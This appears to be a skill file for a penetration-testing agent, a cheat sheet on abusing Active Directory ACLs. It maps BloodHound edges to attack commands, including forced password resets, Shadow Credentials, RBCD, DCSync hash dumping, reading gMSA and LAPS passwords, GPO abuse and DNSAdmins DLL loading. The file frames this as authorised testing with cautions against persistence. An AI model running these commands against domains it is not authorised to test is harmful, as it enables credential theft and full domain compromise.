---
name: windows-ldap-acl
description: LDAP/ACL abuse on AD objects — GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddSelf, WriteSPN, Shadow Credentials, gMSA, LAPS, GPO, BloodHound edges.
metadata:
  version: '1.0'
---

# LDAP ACL abuse

Needs a domain principal. Map with BloodHound (`windows-ad-auth`) or raw LDAP. Abuse **one** object at a time and record the edge + proof.

## Read: who can do what

```
bloodhound-python -d <domain> -u <user> -p '<pass>' -ns <dc-ip> -c ACLs,ObjectProps,Container --zip
dacledit.py -action read -target '<sAMAccountName>' <domain>/<user>:'<pass>'
nxc ldap <dc-ip> -u <user> -p '<pass>' --bloodhound --collection ACLs
```

Also dump: `nTSecurityDescriptor` is heavy; prefer BloodHound.

## Edge → action

| Rights on | Abuse | Tool sketch |
|---|---|---|
| User `ForceChangePassword` | Reset password | `net rpc password` / `bloodyAD --set password` / `passwd.py` |
| User `GenericAll` / `GenericWrite` | Reset password, WriteSPN, Shadow Creds, target Kerberoast | below |
| User `WriteSPN` | Targeted Kerberoast | `targetedKerberoast.py` |
| User/Computer `WriteProperty` `msDS-KeyCredentialLink` | Shadow Credentials | `certipy shadow auto -account <sam>` |
| Computer `GenericWrite` / `AddAllowedToAct` | RBCD | write allowed-to-act → `getST.py` |
| Group `AddSelf` / `GenericAll` | Add yourself | `bloodyAD add groupMember` |
| GPO `GenericWrite` / `CreateChild` | GPO instant logon script / Scheduled Task | `pyGPOAbuse` — high impact; prefer a proof task on a test OU |
| OU `GenericAll` / `WriteDACL` | Inherit ACLs downward | `dacledit.py -action write` |
| Domain / DC `DCSync` (`DS-Replication-Get-Changes` + All) | Dump hashes | `secretsdump.py -just-dc` |
| `WriteDACL` on anything | Grant yourself GenericAll then the row above | `dacledit.py` |
| `WriteOwner` | Take ownership then WriteDACL | `owneredit.py` |
| gMSA `GenericAll` | Read `msDS-ManagedPassword` | `gMSADumper.py` |
| LAPS readable | `ms-MCS-AdmPwd` | ldapsearch / `nxc ldap --laps` |

## Shadow Credentials (PKINIT)

```
certipy shadow auto -u '<user>@<domain>' -p '<pass>' -account '<target>' -dc-ip <dc-ip>
certipy auth -pfx <target>.pfx -dc-ip <dc-ip>
```

Yields NT hash / TGT of target. Finding: “Shadow Credentials on X”.

## Force change password

```
bloodyAD --host <dc-ip> -d <domain> -u <user> -p '<pass>' set password <target> '<NewPass>'
```

Prefer a **test** password and record the change; do not lock out production admins.

## WriteDACL / GenericAll on a computer

RBCD path (`windows-kerberos`) or Shadow Credentials on the computer account.

## GPO

If BloodHound shows `GenericWrite` on a GPO linked to a workstation OU: `pygpoabuse.py` with a proof command (`whoami > \\<ip>\share\proof.txt`) rather than a persistent backdoor.

## DNSAdmins

Member of `DNSAdmins` + load DLL via `dnscmd /config /serverlevelplugindll` — DC RCE. Treat as DC compromise path; prefer documenting the group membership as a finding if you cannot load a DLL safely.

## Backup Operators

Can read `ntds.dit` / SAM via disk shadow. `nxc smb --ntds` as that user, or `diskshadow` + copy. Finding: Backup Operators → NTDS.

## Exchange / PrivExchange / AD-CS web

`WriteDACL` on Exchange objects or `Privileged` Exchange groups → often DCSync-equivalent. Load `windows-adcs` if the path is HTTP enrollment.

## Extra LDAP issues (not only ACLs)

- **LDAP anonymous** (already `windows-ad-unauth`).
- **LDAP signing not required** + **no channel binding** ⇒ relay to LDAP (`windows-coerce-relay`).
- **Pre-Win2k computers** with blank password.
- **AdminSDHolder**: if you can write it, persistence on protected groups — record, don't persist by default.
